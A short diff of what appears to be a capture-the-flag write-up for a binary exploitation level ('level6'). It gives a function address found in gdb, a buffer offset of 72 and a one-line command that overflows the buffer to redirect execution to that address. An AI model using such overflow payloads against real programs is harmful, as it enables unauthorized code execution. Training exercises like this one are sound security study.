@@ -5,7 +5,7 @@ gdb n
 0x8048454 <n>:	0x83e58955
 
 The playload:
-To get the offset of the payload //to check it with gdbpedra
+To get the offset of the payload
 offset = 72
 
 ./level6 $(python -c "print 'A' *72 + '\x54\x84\x04\x08'")
